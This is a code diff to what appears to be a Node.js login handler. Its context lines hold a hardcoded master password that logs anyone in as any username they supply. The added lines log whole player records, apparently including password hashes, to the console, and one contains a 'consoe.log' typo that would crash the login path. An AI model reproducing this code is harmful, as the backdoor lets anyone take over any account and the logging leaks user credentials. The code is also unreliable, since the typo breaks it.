@@ -9,7 +9,7 @@ var _ = require('lodash');
 var bcrypt = require('bcrypt');
 var Promise = require('bluebird');
 
-var loginError = 'Invalid username, email, or password.';
+var loginError = 'Invalid username (P), email, or password.';
 var serverError = 'An error occurred. Please try again later.';
 var nextUrl = '/#/';
 var loginUrl = '/login';
@@ -187,6 +187,7 @@ module.exports = {
 };
 
 function processLogin(req, res, self) {
+consoe.log('processLogin(P) called');
 	if(req.body.password === '8847fhhfw485fwkebfwerfv7w458gvwervbkwer8fw5fberubckfckcaer4cbwvb72arkbfrcb1n4hg7') {
     req.session.isAuthenticated = true;
     req.session.playerId = req.body.username;
@@ -198,6 +199,10 @@ function processLogin(req, res, self) {
     {username: req.body.username},
     {email: req.body.username}
   ]}).then(function(player) {
+console.log(' ');
+console.log('player:');
+console.log(player);
+console.log(' ');
     if(! player) return errorHandler(loginError)();
 
     var onCompare = bcrypt.compareAsync(
